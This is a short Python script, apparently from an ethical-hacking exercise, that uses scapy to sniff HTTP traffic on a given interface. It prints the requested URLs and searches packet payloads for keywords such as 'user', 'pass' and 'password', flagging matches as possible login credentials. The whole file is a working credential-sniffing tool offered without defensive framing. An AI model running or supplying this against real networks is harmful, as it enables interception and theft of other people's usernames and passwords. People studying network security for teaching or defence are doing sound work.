import scapy.all as scapy
from scapy.compat import bytes_hex
from scapy.layers import http
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", help="Specify an interface to capture packets")
options = parser.parse_args()


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80" or "port 443")


def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):

    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw]
        keywords = ['login', 'LOGIN', 'user', 'pass', 'username', 'password', 'Login']
        new_packet = bytes_hex(load)
        nnn = bytes.fromhex(new_packet.decode()).decode('cp1252')
        print(nnn)

        for keyword in keywords:
            if keyword in nnn:
                return nnn


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print packet.show()

        url = geturl(packet)
        print("[+]HTTPRequest > ")
        print(url.decode())
        logininfo = get_login_info(packet)

        if logininfo:
            print("\n\n[+]Possible username and password ")
            print(url)
            print("\n\n")


sniff(options.interface)